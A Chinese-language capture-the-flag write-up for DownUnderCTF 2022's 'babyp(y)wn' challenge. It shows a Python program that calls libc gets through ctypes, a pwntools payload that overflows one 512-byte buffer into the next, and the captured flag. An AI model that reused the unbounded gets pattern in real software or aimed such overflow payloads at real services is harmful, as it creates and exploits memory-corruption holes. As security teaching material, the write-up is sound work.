# DownUnderCTF 2022 babyp(y)wn Writeup

## 题目简述

题目表面是 Python 程序，但通过 `ctypes` 直接调用 libc 的 `gets`：

```python
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```

Python 对象本身有边界管理，不代表经 FFI 调用的 C 函数仍然安全。`gets` 不接收目标缓冲区长度，会持续写到换行或 EOF。

## 解题过程

两个 `c_buffer(512)` 在该进程中相邻分配。向 `buf1` 写满 512 字节后继续输入，后续内容会越界进入 `buf2`。条件只要求 `buf2` 的字节串中出现 `DUCTF`，不需要劫持控制流。

最小 payload 为：

```python
from pwn import *

io = remote(HOST, PORT)
io.sendline(b'A' * 512 + b'DUCTF')
print(io.recvline().decode())
```

`gets` 还会在输入末尾写入空字节，但它位于 `DUCTF` 之后，不影响包含关系判断。程序随后输出：

```text
DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
```

## 方法总结

FFI 会穿透高级语言的内存安全边界。审计 Python、JavaScript 等程序时，只要看到 `ctypes`、native addon 或不安全系统接口，就应按底层 ABI 和缓冲区布局重新分析。本题只需把越界写转化为相邻数据破坏，不必为了“像 Pwn”而构造多余的 ROP 链。
